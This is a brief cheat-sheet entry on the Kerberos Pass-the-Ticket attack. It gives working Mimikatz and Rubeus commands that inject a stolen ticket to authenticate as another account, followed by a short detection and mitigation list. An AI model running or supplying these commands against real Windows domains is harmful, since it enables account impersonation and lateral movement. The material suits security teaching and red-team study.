# Pass-the-Ticket (PtT)
**What:** Inject/exploit Kerberos tickets (TGT/TGS) into a session to authenticate as another account without credential or hash.  
**Privileges needed:** Access to a valid ticket blob (stolen/exported ticket).  
**Common tools:** Mimikatz, Rubeus.

--- 
## Mimikatz — import ticket file (.kirbi or base64)
```bash
# in mimikatz (elevated) 
privilege::debug kerberos::ptt C:\path\to\ticket.kirbi    # or paste base64: kerberos::ptt /ticket:<base64-string>`
```
## Rubeus (ptt)

```bash
# ptt using a file 
Rubeus.exe ptt /ticket:ticket.kirbi 

# ptt using base64 inline 
Rubeus.exe ptt /ticket:<base64_ticket>
```

--- 

## **Detection / Mitigation**

- Detect use by monitoring ticket lifetimes, unusual service access patterns, suspicious host-to-host Kerberos activity.
    
- Mitigate by restricting ticket exposure, using short ticket lifetimes, and monitoring for `TicketGrantingTicket` anomalies.
    
